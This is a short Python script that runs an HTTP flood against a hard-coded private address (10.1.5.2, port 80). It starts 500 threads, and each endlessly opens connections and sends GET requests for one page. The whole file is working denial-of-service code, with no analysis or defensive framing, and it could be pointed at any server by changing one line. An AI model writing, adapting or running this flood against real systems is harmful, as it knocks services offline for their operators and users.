import socket
import threading

# Configuration for target IP, port, and the path to request
target = '10.1.5.2'
port = 80
path = '/1.html'  # The path to the file you want to request

def http_flood():
    while True:
        try:
            # Establish a socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            # Send an HTTP GET request
            request = f"GET {path} HTTP/1.1\r\nHost: {target}\r\n\r\n"
            s.send(request.encode('ascii'))
            print("HTTP Request Sent")
            s.close()  # Close the socket connection
        except Exception as e:
            print(f"Error sending request: {e}")

# Starting the threads
for i in range(500):
    thread = threading.Thread(target=http_flood)
    thread.start()
